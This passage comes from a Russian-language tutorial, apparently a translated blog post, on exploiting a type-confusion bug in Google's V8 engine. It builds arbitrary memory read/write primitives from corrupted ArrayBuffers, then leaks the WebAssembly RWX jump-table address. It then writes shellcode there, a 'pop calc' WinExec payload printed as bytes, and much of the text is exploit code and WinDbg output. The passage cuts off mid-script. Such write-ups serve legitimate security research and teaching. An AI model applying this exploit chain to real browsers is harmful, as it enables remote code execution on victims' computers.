буферов массива.\n\r\n\n\r\nТак как все адреса внутри V8 являются 32-битными, мы воспользуемся массивом беззнакового 64-битного типа integer. Ниже представлен пример примитива чтения и записи, созданный из показанного выше примера кода.\n\r\n\n\r\n\nlet memory = {\n\tread64(addr) {\n\t\tview1[4] = addr;\n\t\tlet view2 = new BigUint64Array(arrBuf2);\n\t\treturn view2[0];\n\t},\n\twrite64(addr, ptr) {\n\t\tview1[4] = addr;\n\t\tlet view2 = new BigUint64Array(arrBuf2);\n\t\tview2[0] = ptr;\n\t}\n};\n\r\nДля тестирования его работоспособности попробуем использовать примитив памяти \nwrite64\n, чтобы записать значение \n0x41414141n\n в хранилище второго буфера массива. Код будет выглядеть вот так:\n\r\n\n\r\n\nprint(\"[+] Finding Overlapping Properties...\");\nfindOverlappingProperties();\nprint(`[+] Properties p${p1} and p${p2} overlap!`);\n\n// Создаём буферы массива\nlet arrBuf1 = new ArrayBuffer(1024);\nlet arrBuf2 = new ArrayBuffer(1024);\n\n// Выполняем утечку адреса arrBuf2\nprint(\"[+] Leaking ArrayBuffer Address...\");\nlet arrBuf2Addr = addrOf(arrBuf2);\nprint(`[+] ArrayBuffer Address: 0x${arrBuf2Addr.toString(16)}`);\n\n// Повреждаем указатель хранилища arrBuf1 при помощи адреса arrBuf2\nprint(\"[+] Corrupting ArrayBuffer Backing Store Address...\")\nlet originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);\n\n// Сохраняем исходный указатель хранилища arrBuf2\nlet view1 = new BigUint64Array(arrBuf1)\nlet originalArrBuf2BackingStore = view1[4]\n\n// Создаём примитив чтения и записи памяти\nlet memory = {\n\tread64(addr) {\n\t\tview1[4] = addr;\n\t\tlet view2 = new BigUint64Array(arrBuf2);\n\t\treturn view2[0];\n\t},\n\twrite64(addr, ptr) {\n\t\tview1[4] = addr;\n\t\tlet view2 = new BigUint64Array(arrBuf2);\n\t\tview2[0] = ptr;\n\t}\n};\nprint(\"[+] Constructed Memory Read and Write Primitive!\");\n\n// Записываем данные во второй буфер массива\nmemory.write64(originalArrBuf2BackingStore, 0x41414141n);\n%DebugPrint(arrBuf2);\n\r\nДалее мы снова можем использовать WinDbg для отладки этого кода, установив точку останова на \nRUNTIME_FUNCTION(Runtime_DebugPrint)\n и исполнив скрипт. Дойдя до точки останова, введём \ng\n или нажмём на \nGo\n, а затем нажмём \nShift + F11\n или «Step Over», чтобы просмотреть в консоли отладочный вывод.\n\r\n\n\r\n\n[+] Finding Overlapping Properties...\n[+] Properties p15 and p22 overlap!\n[+] Leaking ArrayBuffer Address...\n[+] ArrayBuffer Address: 0x39532f0db50\n[+] Corrupting ArrayBuffer Backing Store Address...\n[+] Constructed Memory Read and Write Primitive!\nDebugPrint: 0000039532F0DB51: [JSArrayBuffer] in OldSpace\n - map: 0x03a3a6384371 <Map(HOLEY_ELEMENTS)> [FastProperties]\n - prototype: 0x02ac8fd10b21 <Object map = 000003A3A63843C1>\n - elements: 0x009c20b82cf1 <FixedArray[0]> [HOLEY_ELEMENTS]\n - embedder fields: 2\n - backing_store: 000002791B474430\n - byte_length: 1024\n - neuterable\n - properties: 0x009c20b82cf1 <FixedArray[0]> {}\n - embedder fields = {\n    0000000000000000\n    0000000000000000\n }\n\r\nКак видите, указатель хранилища находится по адресу \n0x000002791B474430\n. Просмотрим этот адрес при помощи WinDbg и убедимся, что действительно выполнили запись в этот буфер.\n\r\n\n\r\n\n0:000> dq 000002791B474430 L6\n00000279`1b474430  00000000`41414141 00000000`00000000\n00000279`1b474440  00000000`00000000 00000000`00000000\n00000279`1b474450  00000000`00000000 00000000`00000000\n\r\nВот и всё! Мы успешно создали примитив чтения/записи памяти и теперь можем записывать данные в любое место кучи V8. Разобравшись с этим, мы можем переходить к следующему этапу эксплойта — получению возможности удалённого исполнения кода!\n\r\n\n\r\n\nПолучаем возможность исполнения кода\n\r\nСоздав примитивы памяти, мы должны найти способ заставить V8 исполнять наш код. К сожалению, мы не можем просто записать или внедрить шеллкод в произвольные области кучи V8 или в буфер массива, поскольку включён \nNX\n.\n\r\n\n\r\nВ этом можно убедиться, выполнив функцию WinDbg \nvprot\n с указателем хранилища буфера массива.\n\r\n\n\r\n\n0:000> !vprot 000002791B474430\nBaseAddress:       000002791b474000\nAllocationBase:    000002791b390000\nAllocationProtect: 00000004  PAGE_READWRITE\nRegionSize:        000000000001b000\nState:             00001000  MEM_COMMIT\nProtect:           00000004  PAGE_READWRITE\nType:              00020000  MEM_PRIVATE\n\r\nКак видите, у нас есть только доступ на чтение и запись этих страниц, но нет разрешений на исполнение.\n\r\n\n\r\nТак как мы не можем исполнять наш код на этих страницах памяти, нужно найти другое решение.\n\r\n\n\r\nПотенциальное решение — нацелиться на страницы памяти JIT. JIT-компиляция кода на JavaScript требует от компилятора записывать команды на страницу памяти, чтобы позже их можно было исполнить. Так как это происходит согласованно с исполнением кода, эти страницы обычно имеют разрешения RWX. Это может быть хорошей целью для наших примитивов чтения/записи памяти: мы можем попробовать выполнить утечку указателя из скомпилированной JIT функции JavaScript, записать свой шеллкод по этому адресу, а затем вызвать функцию для исполнения нашего кода.\n\r\n\n\r\nОднако в начале 2018 года команда разработчиков V8 добавила защиту под названием \nwrite_protect_code_memory\n, которая переключает разрешения страницы памяти JIT для JavaScript между чтением/исполнением и чтением/записью. В результате эти страницы во время исполнения JavaScript помечаются как для чтения/исполнения, что не позволит нам записывать в них свой код.\n\r\n\n\r\nОдин из способов обхода этой защиты заключается в использовании \nReturn Oriented Programming (ROP)\n. Благодаря ROP мы можем эксплойтить \nvtable\n (которые хранят адреса виртуальных функций) и указатели функций JIT или даже повреждать стек.\n\r\n\n\r\nПримеры того, как можно использовать ROP-гаджеты для эксплойтинга vtable, есть в посте \nOne Day Short of a Full Chain: Part 3 — Chrome Renderer RCE\n и в посте \nКоннора Макгарра\n \nBrowser Exploitation on Windows\n.\n\r\n\n\r\nХотя ROP — эффективная техника для разработки эксплойтов, я живу с девизом «Работай с умом, а не до ночи» и не хочу делать много работы. К счастью для нас, JavaScript — не единственный язык, который компилирует V8, есть ещё и \nWebAssembly\n!\n\r\n\n\r\n\nОсновы внутреннего устройства WebAssembly\n\r\nWebAssembly (также известный как wasm) — это низкоуровневый язык программирования, спроектированный для исполнения внутри браузера на стороне клиента; часто он используется для поддержки C/C++ и похожих языков.\n\r\n\n\r\nОдно из преимуществ WebAssembly заключается в том, что он позволяет осуществлять коммуникации между модулями WebAssembly и контекстом JavaScript. Благодаря этому модули WebAssembly могут получать доступ к функциональности браузеров через те же Web API, которые доступны JavaScript.\n\r\n\n\r\nИзначально движок V8 не компилирует WebAssembly. Функции wasm компилируются при помощи baseline-компилятора \nLiftoff\n. Liftoff один раз итеративно обходит код на WebAssembly и немедленно создаёт машинный код для каждой команды WebAssembly, аналогично тому, как SparkPlug преобразует байт-код Ignition в машинный код.\n\r\n\n\r\nТак как wasm тоже компилируется JIT, его страницы памяти помечены разрешениями Read-Write-Execute. Существует соответствующий \nwrite-protect-flag\n для wasm, но по умолчанию он отключен из-за файла \nasm.js\n (причины этого объяснил \nДжонатан Норман\n). Это делает wasm ценным инструментом для разработки нашего эксплойта.\n\r\n\n\r\nПрежде чем мы сможем использовать WebAssembly в своём эксплойте, нам нужно немного разобраться в его структуре и работе. Я не буду подробно рассматривать WebAssembly, потому что само по себе это может стать темой отдельного поста. Расскажу только о важных частях, которые нам необходимо знать. В WebAssembly скомпилированный блок кода называется «\nмодулем\n». Затем эти модули \nпорождаются\n для создания исполняемого объекта под названием «\nэкземпляр\n». Экземпляр (instance) — это объект, содержащий все \nэкспортированные функции WebAssembly\n, позволяющие вызывать код на WebAssembly из JavaScript.\n\r\n\n\r\nВ движке V8 эти объекты называются \nWasmModuleObject\n и \nWasmInstanceObject\n; их можно найти в файле исходников \nv8/src/wasm/wasm-objects.h\n.\n\r\n\n\r\nWebAssembly — это формат двоичных команд, а его модуль схож с файлом Portable Executable (PE). Как и файл PE, модуль WebAssembly содержит разделы. В модуле WebAssembly есть примерно 11 стандартных разделов:\n\r\n\n\r\n\n\r\n\nType\n\r\n\nImport\n\r\n\nFunction\n\r\n\nTable\n\r\n\nMemory\n\r\n\nGlobal\n\r\n\nExport\n\r\n\nStart\n\r\n\nElement\n\r\n\nCode\n\r\n\nData\n\r\n\n\r\nБолее подробно о каждом разделе объясняется в статье \"\nIntroduction to WebAssembly\n\".\n\r\n\n\r\nНас интересует раздел \ntable\n. Table в WebAssembly — это механизм сопоставления значений, которые нельзя представить в WebAssembly или к которым не может получить доступ WebAssembly, например, ссылок GC, сырых дескрипторов ОС или нативных указателей. Кроме того, каждая таблица имеет тип элемента, указывающий вид данных, которые она содержит.\n\r\n\n\r\nВ WebAssembly каждый экземпляр имеет одну выделенную «стандартную» table, индексируемую по операции \ncall_indirect\n. Эта операция является командой, выполняющей \nвызов\n функции в стандартной table.\n\r\n\n\r\nВ 2018 году команда разработчиков V8 дополнила WebAssembly, добавив \nиспользование таблиц переходов для всех вызовов\n, чтобы реализовать ленивую компиляцию и более эффективные tier-up. В результате этого все вызовы функций WebAssembly в V8 вызывают слот в этой таблице переходов, которая затем выполняет переход к реальному скомпилированному коду (или заглушке \nWasmCompileLazy\n).\n\r\n\n\r\nВ V8 таблица переходов (также называемая таблицей кода) служит центральной точкой диспетчеризации для всех вызовов в WebAssembly (прямых и косвенных). Таблица переходов хранит по одному слоту на функцию в модуле, а каждый слот содержит переход к текущему публикуемому \nWasmCode\n, соответствующему ассоциированной функции. Подробнее о реализации таблицы переходов можно прочитать в файле исходников \n/src/wasm/jump-table-assembler.h\n.\n\r\n\n\r\nПри генерации кода WebAssembly компилятор делает его доступным системе, внося его в таблицу кода и выполняя патчинг таблицы переходов для конкретного экземпляра. Затем она возвращает сырой указатель на объект \nWasmCode\n. Так как этот код компилируется JIT, указатель указывает на раздел в памяти, имеющий разрешения RWX. Каждый раз при вызове соответствующей функции \nWasmCode\n движок V8 переходит по этому адресу и исполняет скомпилированный код.\n\r\n\n\r\nЧтобы получить возможность удалённого исполнения кода, мы нацелимся на этот самый RWX-раздел памяти своими примитивами чтения/записи памяти.\n\r\n\n\r\n\nЗлонамеренное использование памяти WebAssembly\n\r\nТеперь, когда мы лучше понимаем WebAssembly и знаем, что для удалённого исполнения кода нужно нацелиться на указатель таблицы переходов, давайте напишем код на wasm и изучим, как он выглядит в памяти, чтобы лучше понимать, как использовать его для нашего эксплойта.\n\r\n\n\r\nУдобно писать код на wasm можно при помощи \nWasmFiddle\n, который позволит нам писать код на C и получать выводы буфера кода и код на JavaScript, который необходим для его исполнения. Воспользовавшись стандартным кодом, \nвозвращающим 42\n, мы получим следующий код JavaScript.\n\r\n\n\r\n\nvar wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);\nvar wasmModule = new WebAssembly.Module(wasmCode);\nvar wasmInstance = new WebAssembly.Instance(wasmModule);\nvar func = wasmInstance.exports.main;\n\r\nИсполнив этот код в d8, мы можем использовать переменную \n%DebugPrint\n с переменной \nwasmInstance\n, которая будет объектом исполняемого модуля, содержащим экспорты наших функций. Как видите, в последней строке кода на wasm мы нацеливаем переменную \nfunc\n на основной экспорт экземпляра wasm, который будет указывать на наш исполняемый \nwasmCode\n.\n\r\n\n\r\nСделав это, мы получаем следующий вывод.\n\r\n\n\r\n\nd8> %DebugPrint(wasmInstance)\nDebugPrint: 0000032B465226A9: [WasmInstanceObject] in OldSpace\n - map: 0x02d1cc30ae51 <Map(HOLEY_ELEMENTS)>\n - module_object: 0x0135bd78e159 <Module map = 000002D1CC30A8B1>\n - exports_object: 0x0135bd78e341 <Object map = 000002D1CC30C3E1>\n - native_context: 0x032b465039f9 <NativeContext[248]>\n - memory_object: 0x032b465227a9 <Memory map = 000002D1CC30B851>\n - imported_function_instances: 0x00bca7c82cf1 <FixedArray[0]>\n - imported_function_callables: 0x00bca7c82cf1 <FixedArray[0]>\n - managed_native_allocations: 0x0135bd78e2d1 <Foreign>\n - memory_start: 00000273516A0000\n - memory_size: 65536\n - memory_mask: ffff\n - imported_function_targets: 00000272D08C73D0\n - globals_start: 0000000000000000\n - imported_mutable_globals: 00000272D08C7410\n - indirect_function_table_size: 0\n - indirect_function_table_sig_ids: 0000000000000000\n - indirect_function_table_targets: 0000000000000000\n...\n\r\nПроанализировав вывод, мы видим, что в нём отсутствует ссылка на таблицу переходов. Однако если взглянуть на код V8 для \nWasmInstanceObject\n, то мы увидим, что в нём есть ссылка на доступ к запись \njump_table_start\n для нашей функции. Эта запись должна указывать на RWX-область памяти, где хранится машинный код.\n\r\n\n\r\nВ V8 это смещение до этой записи \njump_table_start\n, но между версиями V8 она регулярно меняется. Следовательно, нам нужно вручную определять, где этот адрес хранится внутри \nWasmInstanceObject\n.\n\r\n\n\r\nДля определения места хранения этого адреса в \nWasmInstanceObject\n можно использовать команду \n!address\n WinDbg, отображающую информацию о памяти, используемой процессом d8. Так как мы знаем, что адрес \njump_table_start\n имеет разрешения RWX, можно отфильтровать вывод адреса по константе защиты \nPAGE_EXECUTE_READWRITE\n, чтобы поискать недавно созданные RWX-области памяти.\n\r\n\n\r\nВ результате получим следующий вывод.\n\r\n\n\r\n\n0:004> !address -f:PAGE_EXECUTE_READWRITE\n\n        BaseAddress      EndAddress+1        RegionSize     Type       State                 Protect             Usage\n--------------------------------------------------------------------------------------------------------------------------\n      55`6c400000       55`6c410000        0`00010000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [I....lU...A....D]\n\r\nПохоже, в данном случае записью таблицы переходов для RWX-области памяти будет адрес \n0x556C400000\n. Давайте убедимся, что в нашем \nWasmInstanceObject\n действительно хранится этот указатель, изучив содержимое памяти адреса объекта \nwasmInstace\n в WinDbg.\n\r\n\n\r\n\n0:004> dq 0000032B465226A9-1 L22\n0000032b`465226a8  000002d1`cc30ae51 000000bc`a7c82cf1\n0000032b`465226b8  000000bc`a7c82cf1 00000135`bd78e159\n0000032b`465226c8  00000135`bd78e341 0000032b`465039f9\n0000032b`465226d8  0000032b`465227a9 000000bc`a7c825a1\n0000032b`465226e8  000000bc`a7c825a1 000000bc`a7c825a1\n0000032b`465226f8  000000bc`a7c825a1 000000bc`a7c82cf1\n0000032b`46522708  000000bc`a7c82cf1 000000bc`a7c825a1\n0000032b`46522718  00000135`bd78e2d1 000000bc`a7c825a1\n0000032b`46522728  000000bc`a7c825a1 000000bc`a7c822a1\n0000032b`46522738  00000097`8399dba1 00000273`516a0000\n0000032b`46522748  00000000`00010000 00000000`0000ffff\n0000032b`46522758  00000272`d08d45f8 00000272`d08dc6c8\n0000032b`46522768  00000272`d08dc6b8 00000272`d08c73d0\n0000032b`46522778  00000000`00000000 00000272`d08c7410\n0000032b`46522788  00000000`00000000 00000000`00000000\n0000032b`46522798  00000055`6c400000 000000bc`00000000\n0000032b`465227a8  000002d1`cc30b851 000000bc`a7c82cf1\n\r\nПроанализировав вывод, мы видим, что запись указателя таблицы переходов на RWX-страницу памяти и в самом деле хранится в объекте \nwasmInstance\n по адресу \n0x32b46522798\n!\n\r\n\n\r\nДалее мы можем выполнить небольшие шестнадцатеричные вычисления, чтобы найти смещение до RWX-страницы от базового адреса \nWasmInstanceObject\n минус 1 (из-за маркировки указателей).\n\r\n\n\r\n\n0x798 – (0x6A9-0x1) = 0xF0 (240)\n\r\nМы выяснили, что смещение таблицы переходов составляет 240 байтов, или \n0xF0\n, от базового адреса объекта экземпляра. Поэтому мы можем изменить скрипт эксплойта, добавив показанный выше пример кода на WebAssembly, а затем попытавшись выполнить утечку RWX-адреса записи таблицы переходов!\n\r\n\n\r\nОднако у нас есть небольшая проблема. К сожалению, мы больше не можем использовать примитив \naddrOf\n для утечки адреса объекта. Причина заключается в том, что примитив \naddrOf\n использует баг, перезаписывая пересекающиеся свойства. По сути, это разрушит наш примитив чтения/записи памяти, созданный на основе буферов массива, что приведёт к записи в неправильные области памяти и потенциальным сбоям.\n\r\n\n\r\nВ данном случае нам нужно использовать наш примитив чтения/записи памяти на основе буферов массива для утечки адреса объекта. Взяв уже имеющееся у нас, мы можем создать ещё один примитив \naddrOf\n на основе буферов массива, сделав следующее:\n\r\n\n\r\n\n\r\n\nдобавив ко второму буферу массива внешнее свойство;\n\r\n\nвыполнив утечку адреса хранилища второго буфера массива;\n\r\n\nиспользовав примитив памяти \nread64\n для считывания адреса объекта по смещению 16 в хранилище свойств.\n\r\n\n\r\nПрежде чем мы это реализуем, давайте посмотрим, как это выглядит в памяти, чтобы убедиться, что всё сработает. Начнём с создания нового буфера массива под названием \narrBuf1\n, а затем создадим случайный объект.\n\r\n\n\r\n\nd8> let arrBuf1 = new ArrayBuffer(1024);\nd8> let obj = {x:1}\n\r\nДалее зададим новое внешнее свойство для \narrBuf1\n с именем \nleakme\n и зададим в качестве его значения наш объект.\n\r\n\n\r\n\nd8> arrBuf1.leakme = obj;\n\r\nЗапустив команду \n%DebugPrint\n для \narrBuf1\n, мы увидим, что теперь в хранилище данных свойств есть новое внешнее свойство.\n\r\n\n\r\n\nd8> %DebugPrint(arrBuf1)\nDebugPrint: 000003B88950D8B9: [JSArrayBuffer]\n - map: 0x02fd7d78c251 <Map(HOLEY_ELEMENTS)> [FastProperties]\n - prototype: 0x01d6b8c90b21 <Object map = 000002FD7D7843C1>\n - elements: 0x03bfa9d82cf1 <FixedArray[0]> [HOLEY_ELEMENTS]\n - embedder fields: 2\n - backing_store: 00000181293E0780\n - byte_length: 1024\n - neuterable\n - properties: 0x03b88950fe29 <PropertyArray[3]> {\n    #leakme: 0x03b88950f951 <Object map = 000002FD7D78C201> (data field 0) properties[0]\n }\n - embedder fields = {\n    0000000000000000\n    0000000000000000\n }\n\r\nКак мы видим, адрес \nobj\n равен \n0x03b88950f951\n, как и в хранилище свойств. Если мы взглянем на хранилище свойств \narrBuf1\n при помощи WinDbg, то увидим, что по смещению 16 в хранилище свойств находится адрес нашего объекта!\n\r\n\n\r\n\n0:005> dq 0x03b88950fe29-1 L6\n000003b8`8950fe28  000003bf`a9d83899 00000003`00000000\n000003b8`8950fe38  000003b8`8950f951 000003bf`a9d825a1\n000003b8`8950fe48  000003bf`a9d825a1 000002fd`7d784fa1\n\r\nОтлично. Мы убедились, что это работает. В таком случае давайте реализуем новую функцию \naddrOf\n для нашего примитива чтения/записи памяти:\n\r\n\n\r\n\nlet memory = {\n  addrOf(obj) {\n    // Задаём адресу объекта значение нового внешнего свойства leakme\n    arrBuf2.leakMe = obj;\n    // Используем примитив read64 для выполнения утечки адреса хранилища свойств буфера массива\n    let props = this.read64(arrBuf2Addr + 8n) - 1n;\n    // Считываем смещение 16 от хранилища буфера массива и возвращаем адрес нашего объекта\n    return this.read64(props + 16n) - 1n;\n  }\n};\n\r\nРеализовав это, мы можем изменить скрипт эксплойта, добавив в него новый примитив \naddrOf\n и код на WebAssembly. Далее мы можем попытаться выполнить утечку адреса \nwasmInstance\n и RWX-страницы таблицы переходов экземпляра.\n\r\n\n\r\nДополненный скрипт будет выглядеть так:\n\r\n\n\r\n\nprint(\"[+] Finding Overlapping Properties...\");\nfindOverlappingProperties();\nprint(`[+] Properties p${p1} and p${p2} overlap!`);\n\n// Создаём буферы массива\nlet arrBuf1 = new ArrayBuffer(1024);\nlet arrBuf2 = new ArrayBuffer(1024);\n\n// Выполняем утечку адреса arrBuf2\nprint(\"[+] Leaking ArrayBuffer Address...\");\nlet arrBuf2Addr = addrOf(arrBuf2);\nprint(`[+] ArrayBuffer Address: 0x${arrBuf2Addr.toString(16)}`);\n\n// Повреждаем указатель хранилища arrBuf1 с адресом arrBuf2\nprint(\"[+] Corrupting ArrayBuffer Backing Store Address...\")\nlet originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);\n\n// Сохраняем исходный указатель хранилища arrBuf2\nlet view1 = new BigUint64Array(arrBuf1)\nlet originalArrBuf2BackingStore = view1[4]\n\n// Создаём примитив чтения и записи памяти\nlet memory = {\n  read64(addr) {\n    view1[4] = addr;\n    let view2 = new BigUint64Array(arrBuf2);\n    return view2[0];\n  },\n  write64(addr, ptr) {\n    view1[4] = addr;\n    let view2 = new BigUint64Array(arrBuf2);\n    view2[0] = ptr;\n  },\n  addrOf(obj) {\n    arrBuf2.leakMe = obj;\n    let props = this.read64(arrBuf2Addr + 8n) - 1n;\n    return this.read64(props + 16n) - 1n;\n  }\n};\nprint(\"[+] Constructed Memory Read and Write Primitive!\");\n\n// Генерируем RWX-область при помощи WASM\nvar wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);\nvar wasmModule = new WebAssembly.Module(wasmCode);\nvar wasmInstance = new WebAssembly.Instance(wasmModule);\nvar func = wasmInstance.exports.main;\n\n// Выполняем утечку адреса WasmInstance\nlet wasmInstanceAddr = memory.addrOf(wasmInstance);\nprint(`[+] WASM Instance Address: 0x${wasmInstanceAddr.toString(16)}`);\n// Утечка\nlet wasmRWXAddr = memory.read64(wasmInstanceAddr + 0xF0n);\nprint(`[+] WASM RWX Page Address: 0x${wasmRWXAddr.toString(16)}`);\n\r\nИсполнив новый скрипт в d8, мы получим следующий вывод\n\r\n\n\r\n\n[+] Finding Overlapping Properties...\n[+] Properties p6 and p18 overlap!\n[+] Leaking ArrayBuffer Address...\n[+] ArrayBuffer Address: 0x37779c8db50\n[+] Corrupting ArrayBuffer Backing Store Address...\n[+] Constructed Memory Read and Write Primitive!\n[+] WASM Instance Address: 0x2998447e580\n[+] WASM RWX Page Address: 0x47f9400000\n\r\nПохоже, нам успешно удалось выполнить утечку адреса \nwasmInstance\n, а также указателя \njump_table_start\n.\n\r\n\n\r\nЧтобы убедиться, что утёкшие адреса действительны, можно воспользоваться WinDbg для изучения адреса \nwasmInstance\n с целью проверки структуры объекта и того, что по смещению 240 на самом деле находится адрес таблицы переходов.\n\r\n\n\r\n\n0:000> dq 0x2998447e580 L22\n00000299`8447e580  000002da`4608ae51 0000005a`4e802cf1\n00000299`8447e590  0000005a`4e802cf1 00000191`5d8d03d1\n00000299`8447e5a0  00000191`5d8d05b9 000000ea`a9d839f9\n00000299`8447e5b0  00000299`8447e681 0000005a`4e8025a1\n00000299`8447e5c0  0000005a`4e8025a1 0000005a`4e8025a1\n00000299`8447e5d0  0000005a`4e8025a1 0000005a`4e802cf1\n00000299`8447e5e0  0000005a`4e802cf1 0000005a`4e8025a1\n00000299`8447e5f0  00000191`5d8d0549 0000005a`4e8025a1\n00000299`8447e600  0000005a`4e8025a1 0000005a`4e8022a1\n00000299`8447e610  0000009a`1229dba1 000001fd`60c00000\n00000299`8447e620  00000000`00010000 00000000`0000ffff\n00000299`8447e630  000001fc`dff063c8 000001fc`dff0e498\n00000299`8447e640  000001fc`dff0e488 000001fc`e0a00b50\n00000299`8447e650  00000000`00000000 000001fc`e0a02720\n00000299`8447e660  00000000`00000000 00000000`00000000\n00000299`8447e670  00000047`f9400000 0000005a`00000000\n00000299`8447e680  000002da`4608b851 0000005a`4e802cf1\n\r\nИзучив память, мы убеждаемся, что успешно выполнили утечку действительных адресов, поскольку \n000002998447e670\n содержит указатель на первую запись таблицы переходов.\n\r\n\n\r\nОтлично, мы приближаемся к завершению! Теперь, когда у нас есть действительный адрес таблицы переходов, указывающий на RWX-страницу памяти, нам осталось записать в эту область памяти шеллкод, а затем запустить функцию WebAssembly для исполнения кода.\n\r\n\n\r\nВ этом посте я использую шеллкод \nNull-Free WinExec PopCalc\n, который при успешном исполнении просто запускает приложение калькулятора. Разумеется, в своём скрипте вы можете реализовать любой другой шеллкод!\n\r\n\n\r\nТак как в нашим коде на WebAssembly используется \nUint8Array\n, нам нужно обернуть наш шеллкод в представление массива того же типа. Ниже показан пример того, как выглядит шеллкод pop calc в нашем скрипте.\n\r\n\n\r\n\n// Подготовка шеллкода калькулятора\nlet shellcode = new Uint8Array([0x48,0x31,0xff,0x48,0xf7,0xe7,0x65,0x48,0x8b,0x58,0x60,0x48,0x8b,0x5b,0x18,0x48,0x8b,0x5b,0x20,0x48,0x8b,0x1b,0x48,0x8b,0x1b,0x48,0x8b,0x5b,0x20,0x49,0x89,0xd8,0x8b,0x5b,0x3c,0x4c,0x01,0xc3,0x48,0x31,0xc9,0x66,0x81,0xc1,0xff,0x88,0x48,0xc1,0xe9,0x08,0x8b,0x14,0x0b,0x4c,0x01,0xc2,0x4d,0x31,0xd2,0x44,0x8b,0x52,0x1c,0x4d,0x01,0xc2,0x4d,0x31,0xdb,0x44,0x8b,0x5a,0x20,0x4d,0x01,0xc3,0x4d,0x31,0xe4,0x44,0x8b,0x62,0x24,0x4d,0x01,0xc4,0xeb,0x32,0x5b,0x59,0x48,0x31,0xc0,0x48,0x89,0xe2,0x51,0x48,0x8b,0x0c,0x24,0x48,0x31,0xff,0x41,0x8b,0x3c,0x83,0x4c,0x01,0xc7,0x48,0x89,0xd6,0xf3,0xa6,0x74,0x05,0x48,0xff,0xc0,0xeb,0xe6,0x59,0x66,0x41,0x8b,0x04,0x44,0x41,0x8b,0x04,0x82,0x4c,0x01,0xc0,0x53,0xc3,0x48,0x31,0xc9,0x80,0xc1,0x07,0x48,0xb8,0x0f,0xa8,0x96,0x91,0xba,0x87,0x9a,0x9c,0x48,0xf7,0xd0,0x48,0xc1,0xe8,0x08,0x50,0x51,0xe8,0xb0,0xff,0xff,0xff,0x49,0x89,0xc6,0x48,0x31,0xc9,0x48,0xf7,0xe1,0x50,0x48,0xb8,0x9c,0x9e,0x93,0x9c,0xd1,0x9a,0x87,0x9a,0x48,0xf7,0xd0,0x50,0x48,0x89,0xe1,0x48,0xff,0xc2,0x48,0x83,0xec,0x20,0x41,0xff,0xd6]);\n\r\nПодготовив шеллкод, мы должны добавить новый примитив памяти \nwrite\n при помощи буферов массива, поскольку текущая функция \nwrite64\n записывает данные только при помощи представления \nBigUint64Array\n.\n\r\n\n\r\nДля этого примитива \nwrite\n мы можем снова использовать код \nwrite64\n, но с двумя небольшими изменениями. Во-первых, нам нужно сделать \nview2\n \nUint8Array\n, а не \nBigUint64Array\n. Во-вторых, для записи полного шеллкода через нашу view мы будем вызывать функцию \nset\n. Это позволяет нам хранить множество значений в буфере массива, а не просто использовать индекс, как раньше.\n\r\n\n\r\nНовый примитив памяти \nwrite\n будет выглядеть так:\n\r\n\n\r\n\nlet memory = {\n  write(addr, bytes) {\n    view1[4] = addr;\n    let view2 = new Uint8Array(arrBuf2);\n    view2.set(bytes);\n  }\n};\n\r\nПосле этого нам остаётся лишь обновить скрипт эксплойта, добавив туда новый примитив \nwrite\n и шеллкод, записав его по утёкшему адресу таблицы переходов. Далее мы вызовем функцию WebAssembly для исполнения нашего шеллкода!\n\r\n\n\r\nГотовый обновлённый скрипт эксплойта будет выглядеть так:\n\r\n\n\r\n\nprint(\"[+] Finding Overlapping Properties...\");\nfindOverlappingProperties();\nprint(`[+] Properties p${p1} and p${p2} overlap!`);\n\n// Создаём буферы массива\nlet arrBuf1 = new ArrayBuffer(1024);\nlet arrBuf2 = new ArrayBuffer(1024);\n\n// Выполняем утечку адреса arrBuf2\nprint(\"[+] Leaking ArrayBuffer Address...\");\nlet arrBuf2Addr = addrOf(arrBuf2);\nprint(`[+] ArrayBuffer Address @ 0x${arrBuf2Addr.toString(16)}`);\n\n// Повреждаем указатель хранилища arrBuf1 адресом arrBuf2\nprint(\"[+] Corrupting ArrayBuffer Backing Store...\")\nlet originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);\n\n// Сохраняем исходный указатель хранилища arrBuf2\nlet view1 = new BigUint64Array(arrBuf1)\nlet originalArrBuf2BackingStore = view1[4]\n\n// Создаём примитивы памяти при помощи буферов массива\nlet memory = {\n  write(addr, bytes) {\n    view1[4] = addr;\n    let view2 = new Uint8Array(arrBuf2);\n    view2.set(bytes);\n  },\n  read64(addr) {\n    view1[4] = addr;\n    let view2 = new BigUint64Array(arrBuf2);\n    return view2[0];\n  },\n  write64(addr, ptr) {\n    view1[4] = addr;\n    let view2 = new BigUint64Array(arrBuf2);\n    view2[0] = ptr;\n  },\n  addrOf(obj) {\n    arrBuf2.leakMe = obj;\n    let props = this.read64(arrBuf2Addr + 8n) - 1n;\n    return this.read64(props + 16n) - 1n;\n  }\n};\n\nprint(\"[+] Constructed Memory Read and Write Primitive!\");\n\nprint(\"[+] Generating a WebAssembly Instance...\");\n\n// Генерируем RWX-область для шеллкода при помощи WASM\nvar wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);\nvar wasmModule = new WebAssembly.Module(wasmCode);\nvar wasmInstance = new WebAssembly.Instance(wasmModule);\nvar func = wasmInstance.exports.main;\n\n// Выполняем утечку адреса экземпляра и указателя начала таблицы переходов\nprint(\"[+] Leaking WebAssembly Instance Address...\");\nlet wasmInstanceAddr = 